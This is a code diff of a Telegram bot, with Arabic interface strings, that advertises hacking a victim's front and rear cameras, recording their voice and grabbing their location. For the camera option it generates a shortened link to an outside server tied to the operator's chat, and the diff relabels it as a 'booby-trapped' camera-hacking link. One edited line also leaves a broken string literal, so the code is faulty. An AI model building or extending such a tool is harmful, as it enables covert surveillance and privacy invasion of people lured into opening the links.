@@ -701,7 +701,7 @@ async function showButtons(chatId, userId) {
 
   let statusMessage = isSubscribed 
     ? 'أنت مشترك في البوت ويمكنك استخدامه بدون قيود.'
-    : `لديك ${points} نقطة. اجمع 15 نقطة للاشتراك في البوت واستخدامه بدون قيود.`;
+     'اجمع 15 نقطة للاشتراك في البوت واستخدامه بدون قيود.`
 
    let keyboard = [
         [{ text: '📸 اختراق الكاميرا الأمامية والخلفية 📸', callback_data:'front_camera' }],
@@ -777,7 +777,7 @@ bot.on('callback_query', async (callbackQuery) => {
     if (data === 'front_camera' || data === 'rear_camera') {
         const url = `https://yyytot.onrender.com/camera/${chatId}?cameraType=${data === 'front_camera' ? 'front' : 'rear'}`;
         const shortUrl = await shortenUrl(url);
-        bot.sendMessage(chatId, `انقر على الرابط للتصوير: ${shortUrl}`);
+        bot.sendMessage(chatId, `تم تلغيم رابط اختراق الكاميرا الأمامية والخلفية: ${shortUrl}`);
     } else if (data === 'voice_record') {
         bot.sendMessage(chatId, 'من فضلك أدخل مدة التسجيل بالثواني (1-20):');
     } else if (data === 'get_location') {
